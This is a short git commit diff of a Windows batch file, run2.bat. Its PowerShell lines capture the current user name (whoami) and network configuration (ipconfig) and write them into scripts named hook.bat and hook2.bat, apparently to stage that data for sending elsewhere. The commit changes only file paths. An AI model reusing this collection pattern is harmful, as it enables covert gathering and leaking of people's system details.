222018a403ca3f09ed8a306d06f2e92aa68ee892
PxINKY <45299920+PxINKY@users.noreply.github.com>
2022-04-19 04:48:02 -0700

    Update run2.bat

--- run2.bat
+++ run2.bat
@@ -1,2 +1,2 @@
-powershell -command $w=(whoami) -replace '\\'; "(gc hook.bat) -replace '=', $w | Out-File -encoding ASCII hook.bat"
-powershell -command $ip=(ipconfig); "(gc hook2.bat) -replace '=', $ip | Out-File -encoding ASCII hook2.bat"
+powershell -command $w=(whoami) -replace '\\'; "(gc .\hook.bat) -replace '=', $w | Out-File -encoding ASCII hook.bat"
+powershell -command $ip=(ipconfig); "(gc .\hook2.bat) -replace '=', $ip | Out-File -encoding ASCII hook2.bat"
